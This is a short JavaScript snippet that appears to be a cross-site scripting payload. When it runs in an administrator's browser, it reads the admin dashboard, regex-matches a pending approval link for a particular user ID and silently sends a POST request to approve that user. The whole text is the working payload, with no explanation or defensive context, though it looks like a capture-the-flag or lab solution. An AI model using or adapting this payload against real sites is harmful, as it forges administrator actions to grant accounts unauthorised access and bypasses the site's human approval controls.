fetch('/admin/dashboard').then(r => r.text()).then(text => {
  let userId = text.match(/4ref.*\/admin\/approve\/(\d+)/);
  if (userId) {
    fetch(`/admin/approve/${userId[1]}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
    });
  }
});
